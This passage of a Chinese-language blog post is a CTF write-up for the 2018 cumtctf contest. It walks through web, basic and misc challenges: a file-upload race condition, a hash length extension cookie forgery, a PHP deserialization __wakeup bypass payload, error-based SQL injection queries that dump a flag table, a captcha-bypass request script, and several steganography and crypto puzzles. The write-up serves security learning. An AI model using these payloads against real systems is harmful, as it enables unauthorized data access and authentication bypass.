class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>题目一看就是很简单的弱比较，但是提交之后却无法正常回显，而是返回you are not admin，再看上图，admin应该就是chengyurui，所以邮箱为 <code>chenyurui@gmail.com</code> ，再提交一个<code>0e12345678</code> 即可。</p>        <h2 id="上传三">          <a href="#上传三" class="heading-link"><i class="fas fa-link"></i></a>上传三</h2>      <p>bp抓包尝试不同的后缀，尝试 <code>phtml</code> 发现可以上传成功，即上传 <code>snow.phtml</code> ，题目返回信息</p><p><img src="/2018/12/07/cumtctf/6.png" alt></p><p>可以看到我们的文件已经上传成功了(文件被执行了)，只是被后台查杀了，这就说明我们可以利用条件竞争来做这道题</p><p>用burpsuite连续发包，在写个代码连续读取</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://202.119.201.199/challenge/web/uploadfile/upload/snow.phtml"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">content = requests.get(url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> content:</span><br><span class="line">print(content)</span><br></pre></td></tr></table></div></figure><p>然后即可读到flag</p><!--flag{$$$_YOU_ARE_THE_BEST_GUY_HEIHEI_$$$}-->        <h2 id="is-hash-safe">          <a href="#is-hash-safe" class="heading-link"><i class="fas fa-link"></i></a>is hash safe??</h2>      <p>题目给出了提示，应该是文件泄露，发现admin.php.swp存在，下载之，在linux下输入命令</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r amdin.php.swp</span><br></pre></td></tr></table></div></figure><p>即可恢复出源代码，核心代码如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="keyword">false</span>;</span><br><span class="line">$role = <span class="string">"guest"</span>;</span><br><span class="line">$salt =<span class="string">"xxxxxxxxxxxxx"</span>;<span class="comment">//len:13</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) </span><br><span class="line">&#123;</span><br><span class="line">        $role = $_COOKIE[<span class="string">"role"</span>];</span><br><span class="line">        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="keyword">if</span> (stripos($role,<span class="string">"admin"</span>)!==<span class="keyword">false</span>&amp;&amp;$hsh === md5($salt.$_COOKIE[<span class="string">"role"</span>])) </span><br><span class="line">        &#123;</span><br><span class="line">                $auth = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">        $s = $role;</span><br><span class="line">        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">        $hsh = md5($salt.$s);</span><br><span class="line">        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>一看就是哈希长度扩展攻击</p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">原理介绍</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">工具介绍</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>我们可以用hashpump工具来做</p><p>由上面介绍的原理可以知道，在本题中，参与第一次md5哈希的可控字符串为guest，也就是说，本题中，我们已知的内容有$salt（代码加的盐，具体内容未知）的长度为13，$salt与guest拼接后的MD5哈希值c70ab9d039f166c5b5f506a5698ebaa1，那么基于此，我们可以构造哈希扩展攻击</p><p><img src="/2018/12/07/cumtctf/4.png" alt></p><p>Input signature输入明文哈希，Input data输入第一次参与哈希的字符串的结尾的一部分，长度为$salt长度加上去掉inputdata之后字符串的长度，附加值随便，但是不能空，由于本题需要role中存在admin，所以我追加的是admin。比如本题中原来第一次参与hash的字符串为guest，我选择最后一个字符t作为inputdata，那么长度就为<code>len($salt)+len(&#39;gues&#39;)=17</code>，之后就会返回构造好的字符串和哈希值，把上面的<code>\x</code>替换为<code>%</code>，之后修改cookie值，<code>role=&gt;guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin</code>，<code>hsh=&gt;37d0fe2c401a689be9608e9f850ef3de</code>，再刷新就可以得到flag了。</p><!--cumtctf{Md5_1s_n0t_safe} -->        <h2 id="淘金">          <a href="#淘金" class="heading-link"><i class="fas fa-link"></i></a>淘金</h2>      <p>这个题目的目标是抢金币达到1000即可通关，每次抢金币需要在三秒内输入验证码，成功即可抢到1金币，如果有毅力的话是可以手动抢的，或者写一个在线识别验证码的程序来自动抢也是可以的，但是这题还有更好的方案就是在我们提交验证码的环节，如果我们在请求中删去验证码字段即可成功抢到金币（也就是说验证码使可以绕过的），只是不确定这个是题目漏洞还是正解。代码如下，为了效率，同时抢多个人·</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url_post = <span class="string">r'http://bxs.cumt.edu.cn/challenge/web/robber/dorob.php'</span></span><br><span class="line">url_get = <span class="string">r'http://bxs.cumt.edu.cn/challenge/web/robber/rob.php?id='</span></span><br><span class="line">cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"2fle5nf7jrvi8lksme7uq0j1a3"</span>,<span class="string">"ssid"</span>:<span class="string">"a9598c3315159a39bbd981b8ec6fdb6d"</span>&#125;   </span><br><span class="line">s = requests.session()</span><br><span class="line">names = [<span class="string">"bxsrc"</span>,<span class="string">"333"</span>,<span class="string">"08163266"</span>,<span class="string">"EddieIvan"</span>]</span><br><span class="line">ids = [<span class="number">144</span>,<span class="number">125</span>,<span class="number">142</span>,<span class="number">109</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(names)):</span><br><span class="line">        data = <span class="string">"user="</span>+str(ids[i])+<span class="string">"&amp;num=1"</span></span><br><span class="line">        req1 = s.get(url=url_get+str(ids[i]),cookies=cookies)</span><br><span class="line">        print(url_get+str(ids[i]))</span><br><span class="line">        req2 = s.post(url=url_post,cookies=cookies,data=data)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></div></figure>        <h2 id="听说你会面向对象">          <a href="#听说你会面向对象" class="heading-link"><i class="fas fa-link"></i></a>听说你会面向对象</h2>      <p>题目给出了源代码，核心代码如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'flag'</span>)+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'dangerrous'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        var_dump(file_exists(<span class="keyword">$this</span>-&gt;file));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)&amp;&amp;!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'你想干嘛'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>题目需要绕过需要__wakeup()函数，百度发现该处存在一个CVE漏洞 <span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/qq_19876131/article/details/52890854" target="_blank" rel="noopener">Click Here</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>我们写php代码序列化</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Admin();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br></pre></td></tr></table></div></figure><p>题目返回 <code>O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code> ，我们只需要把Admin后面的1修改为2然后在url编码即可，最终payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></div></figure>        <h2 id="phpmywind">          <a href="#phpmywind" class="heading-link"><i class="fas fa-link"></i></a>phpmywind</h2>      <p>首先得到flag非常简单，题目好像出bug了，访问首页直接就可以得到flag：）</p><p><img src="/2018/12/07/cumtctf/7.png" alt="payload"></p><p>但是题目好像修复了(事实上题目本身没有任何问题，之所以可看到flag是因为已经有大佬做出来了)，所以我们还是要来一波正解</p><p>题目给出来cms和版本，直接百度搜索漏洞，发现有个前台sql注入漏洞，需要先注册一个合法用户，我注册了一个用户为test_snow，密码123456，登录，然后在该网址下提交如下内容(因为该题目没有回显，所以使用了报错注入)</p><p><img src="/2018/12/07/cumtctf/11.png" alt></p><p>于是就可以看到数据库名，说明该报错方法可用，</p><p><img src="/2018/12/07/cumtctf/12.png" alt></p><p>但是该语句无法使用select语句，网上查找到了另一种报错注入的方法</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@&#96;%27&#96;),(select schema_name from information_schema.schemata limit 1,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></div></figure><p>可以利用这种方法报库名，发现这个库名为 <code>phpmyflag</code> ，虽然不是当前库，但是flag应该就是在这个库中</p><p>爆表名</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@&#96;%27&#96;),(select table_name from information_schema.tables where table_schema&#x3D;0x7068706d79666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></div></figure><p>本题中如果没有报错的话就会显示账号完善成功，这里只需要再次登录一下就可以了，由于题目转义过滤了单引号，所以使用了十六进制绕过</p><p>爆列名</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@&#96;%27&#96;),(select column_name from information_schema.columns where table_name&#x3D;0x666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></div></figure><p>读flag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@&#96;%27&#96;),(select flag from phpmyflag.flag limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></div></figure><p><img src="/2018/12/07/cumtctf/14.png" alt="result"></p><p>之前我以为flag在当前数据库中，走了不少弯路，看来还是自己思维太局限了</p><p><span class="exturl"><a class="exturl__link" href="https://www.0dayhack.com/post-764.html" target="_blank" rel="noopener">参考链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><!--flag{327A6C4304AD5938EAF0EFB6CC3E53DC}-->        <h1 id="BASIC">          <a href="#BASIC" class="heading-link"><i class="fas fa-link"></i></a>BASIC</h1>              <h2 id="decode">          <a href="#decode" class="heading-link"><i class="fas fa-link"></i></a>decode</h2>      <p>hex打开再base64解码即可</p>        <h2 id="白驹过隙">          <a href="#白驹过隙" class="heading-link"><i class="fas fa-link"></i></a>白驹过隙</h2>      <p>访问题目出现</p><blockquote><p>You Have Missed the Flag ~&gt;.&lt;~</p></blockquote><p>开始猜测可能是某次返回的正确的flag，于是一连访问了1000次还是一无所获，后面想到它说 “You <strong>Missed</strong> flag”，所以思路应该是发生了302跳转，抓包也没有发现什么异常，没找到时哪儿发生了302跳转，后面一个偶然的机会，我们在原来题目链接出查看一下链接</p><p><img src="/2018/12/07/cumtctf/8.png" alt></p><p>再看题目页面的链接 <em>http://202.119.201.199/challenge/basic/http/defauIt.php </em> 仔细看一下，会发现两个 <code>default.php</code> 中题目给的链接中default倒数第二位是小写的L，而到了题目中变成了大写的 i ！！，如此的话跳转就清楚了，可以访问default.php(l为小写的L)</p><p><img src="/2018/12/07/cumtctf/9.png" alt></p><p>可以看到确实发生了302跳转，抓包</p><p><img src="/2018/12/07/cumtctf/10.png" alt></p><p>可以看到此处跳转到了defauIt.php(大写的i)，也可以看到我们读到了flag</p><p>或者你也可以直接挑战页面点击题目链接抓包，也可以读到flag，原理是一样的</p><!-- flag{U_a4e_A_Car3fu1_b0y} -->        <h2 id="齐白石">          <a href="#齐白石" class="heading-link"><i class="fas fa-link"></i></a>齐白石</h2>      <p>16进制编辑器查看一下即可在字符串末尾看到flag</p><!-- flag{so_bor1ing_eMeMEMEMEM} -->        <h2 id="encode">          <a href="#encode" class="heading-link"><i class="fas fa-link"></i></a>encode</h2>      <p>题目给出的是jsfuck代码，直接找在线网站运行一下借口得到flag</p><!-- flag{jj_3Nc0d3_i5_fun} -->        <h2 id="DNS解析">          <a href="#DNS解析" class="heading-link"><i class="fas fa-link"></i></a>DNS解析</h2>      <p>直接修改本地hosts文件解开，linux下修改/etc/hosts文件，添加一行数据</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.119.201.199 welcome.bxsteam.xyz</span><br></pre></td></tr></table></div></figure><p>然后访问welcome.bxsteam.xyz即可得到flag</p><!-- flag{H3110_w0rld} -->        <h2 id="签到1">          <a href="#签到1" class="heading-link"><i class="fas fa-link"></i></a>签到1</h2>      <p>邮件查看源代码，base64解码一下即可得到flag</p><!-- flag{this_is_so_easy_is_it?} -->        <h2 id="签到2">          <a href="#签到2" class="heading-link"><i class="fas fa-link"></i></a>签到2</h2>      <p>按照题目要去F12转到控制台在点击网络选项卡，选择重新载入，之后再消息头中的flag字段即可看到flag</p><!-- flag{Linux-Centos} -->        <h2 id="超简单的密码">          <a href="#超简单的密码" class="heading-link"><i class="fas fa-link"></i></a>超简单的密码</h2>      <p>键盘加密，低头看下键盘即可，网上也有在线解密网站</p><!-- flag{isee} -->        <h2 id="滑稽">          <a href="#滑稽" class="heading-link"><i class="fas fa-link"></i></a>滑稽</h2>      <p>ppt伪加密，打开后提示需要输入密码，网上找到一种方法可以绕过</p><blockquote><p>破解pptx只读需要密码<br>重命名qzxdh.pptx为qzxdh.zip，解压到<strong>当前文件夹</strong>后，切换到\ppt之下，用记事本开启presentation.xml文件；<br>把<p:modifyVerifier ...>整块选中并删除，保存并关闭；<br>将文件再打包成qzxdh.zip，更名为pptx即可。<br>本文来自 qzxdh 的CSDN 博客 ，全文地址请点击：<span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy" target="_blank" rel="noopener">https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p:modifyVerifier></p></blockquote><p>按照该方法即可打开PPT，之后拖动首页幻灯片后即可发现后面还藏着一张幻灯片，里面就有flag</p><!-- flag{hua_tian_xia_zhi_da_ji} -->        <h2 id="Fast-30">          <a href="#Fast-30" class="heading-link"><i class="fas fa-link"></i></a>Fast 30</h2>      <p>一道很常规的题目，就是不断把题目返回的信息在两秒之内发回去，这肯定不能人工操作，需要编程，本题需要提交的内容是header头里面的Flag字段的值，代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web.bxsteam.xyz/fast/"</span></span><br><span class="line">header = requests.get(url).headers[<span class="string">"Flag"</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">header = requests.post(url,data=&#123;<span class="string">"key"</span>:header&#125;).headers[<span class="string">'Flag'</span>]</span><br><span class="line">ans = requests.post(url,data=&#123;<span class="string">"key"</span>:header&#125;).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></div></figure><!-- cumtctf{time_1s_a_Resource} -->        <h1 id="MISC">          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a>MISC</h1>              <h2 id="LSB">          <a href="#LSB" class="heading-link"><i class="fas fa-link"></i></a>LSB</h2>      <p>题目给出了提示，lsb色道隐写，丢进steg里面看一下，发现rgb的每个0通道里面，图片上方都有会多出一个黑块，说明和这三个色道有关系</p><p><img src="/2018/12/07/cumtctf/19.png" alt></p><p>提取一下这三个色道的信息，发现时png文件头</p><p><img src="/2018/12/07/cumtctf/20.png" alt></p><p>提取保存为png图片是个二维码，直接扫码就可以看到flag</p><!-- cumtctf{1sb_i4_s0_Ea4y} -->        <h2 id="爱因斯坦">          <a href="#爱因斯坦" class="heading-link"><i class="fas fa-link"></i></a>爱因斯坦</h2>      <p>右键查看图片属性，发现在备注里面有一串字符 <code>this_is_not_password</code>，感觉这应该是压缩包密码，猜测图片中应该隐含了一个压缩包，hed软件打开图片，直接搜索 <code>504b0304</code> (zip文件头)，果然找到了，而且在右边的字符串中还看到了flag.txt字样，直接将这段提取出来，改后缀为zip，解压，提示需要密码，输入前面的字符串 <code>this_is_not_password</code> ，解压即可得到flag</p><!-- flag{dd22a92bf2cceb6c0cd0d6b83ff51606} -->        <h2 id="视而不见">          <a href="#视而不见" class="heading-link"><i class="fas fa-link"></i></a>视而不见</h2>      <p>看了好久没思路，网上发现bmp图像的题目基本都是色道隐写的问题，于是就用stegsolve软件疯狂尝试，analyse-&gt;steteogram-&gt;solver里面修改偏移值找到了flag(233333)</p><p><img src="/2018/12/07/cumtctf/21.png" alt="result"></p>        <h2 id="鲨鱼的套路">          <a href="#鲨鱼的套路" class="heading-link"><i class="fas fa-link"></i></a>鲨鱼的套路</h2>      <p>打开数据包，追踪tcp流，发现如下内容</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br><span class="line">hehe</span><br><span class="line">i will give you flag~</span><br><span class="line">o</span><br><span class="line">but you must tell me te.he anhhao...ao~</span><br><span class="line">woyaohuinongcun</span><br><span class="line">ok i will give you flag~</span><br><span class="line">just revice .......g.receive it</span><br><span class="line">UEsDBBQAAAgIANeFfErNFL6kGwAAABsAAAAcAAAAaGludF9zb21lIF90aGluZ19pc19mYWtlLnR4dEvLSUyvTs5IzUuPL87IjC9JzI&#x2F;PKQUyU&#x2F;NqAVBLAQI&#x2F;ABQACQAIANeFfErNFL6kGwAAABsAAAAcACQAAAAAAAAAIAAAAAAAAABoaW50X3NvbWUgX3RoaW5nX2lzX2Zha2UudHh0CgAgAAAAAAABABgAu7Ux1J+n0gGhDeAnl6fSAaEN4CeXp9IBUEsFBgAAAAABAAEAbgAAAFUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">~</span><br><span class="line">bye~</span><br><span class="line">o</span><br></pre></td></tr></table></div></figure><p>这段应该是base64，但是在线网站无法解码，自己尝试，发现是个压缩包，保存为zip格式</p><p><img src="/2018/12/07/cumtctf/22.png" alt></p><p>之后是zip伪加密</p><p><img src="/2018/12/07/cumtctf/23.png" alt></p><!-- flag{cheng_shi_tao_lu_shen} -->        <h2 id="easy-crypto">          <a href="#easy-crypto" class="heading-link"><i class="fas fa-link"></i></a>easy crypto</h2>      <p>解压之后有个morse.txt，一看就是摩斯密码，解码为 <code>keyisvigenerecipher</code> ，提到了维吉尼亚密码，直接解密flag.txt，key就是 <code>vigenerecipher</code> ，然后解码即可得到flag</p><!-- flag{vigenereencryptionhhh} -->        <h2 id="code">          <a href="#code" class="heading-link"><i class="fas fa-link"></i></a>code</h2>      <p>题目给出了代码</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char getCode(char orgin) &#123;</span><br><span class="line">    return ( key1 * (orgin-97) + key2 ) % 26 + 97;</span><br><span class="line">&#125;</span><br><span class="line">code : joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm</span><br></pre></td></tr></table></div></figure><p>注意题目的路径其实给出了提示 <code>challenge/misc/fangshe/</code> ，最后的 <em>fangshe</em> 其实就是仿射的意思，意思是本题是一道放射密码的题目，就是位置为key1和key2的仿射加密，网上说了key1，key2的范围是小于26的，我们数论刚开始学，我也不是很理解，我个人感觉应该是由于题目的函数如果把key1和key2看做x和y的话，key1 * (orgin-97) + key2就是一条直线，那么key值大于26之后模26是会和前面重复的，这个以后学了得在研究一下，但是这题我们可尝试暴力破解，需要注意的是我之前以为题目给的code是密文，但事实上人家给的是明文，密文是flag …….</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm"</span></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">  <span class="keyword">for</span> key2 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> cipher:</span><br><span class="line">      ans += chr((key1 * (ord(char)<span class="number">-97</span>) + key2) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> ans <span class="keyword">or</span> <span class="string">"ctf"</span> <span class="keyword">in</span> ans:</span><br><span class="line">      print(ans)</span><br></pre></td></tr></table></div></figure><p>跑完之后发现其中一个结果是</p><blockquote><p>heiboyflagisffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p></blockquote><p>断句一下为</p><blockquote><p>hei boy,flag is ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p></blockquote><!-- flag{ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa} -->        <h2 id="PS-Master">          <a href="#PS-Master" class="heading-link"><i class="fas fa-link"></i></a>PS Master</h2>      <p>题目提示的很明显了，和ps有关，那基本就是图层的问题了，但是题目的文件用PS无法打开，binwalk一下发现是个gif图片，修改文件后缀为gif，发现可以用PS打开，打开之后第二个图层是个二维码，但是无法扫描，因为定位块上都有个二哈</p><p><img src="/2018/12/07/cumtctf/35.png" alt="PS提取结果"></p><p>参照标准二维码可以知道，左上，右上，左下都应该是黑色的定位块，可以用win10自带的画图工具把右上的块复制到左上和左下，然后把二哈图案用黑色填充，处理之后如下，扫码可得flag</p><p><img src="/2018/12/07/cumtctf/36.png" alt="result"></p><!-- flag{hi_doge_i_am_er_ha} -->        <h2 id="传感器1">          <a href="#传感器1" class="heading-link"><i class="fas fa-link"></i></a>传感器1</h2>      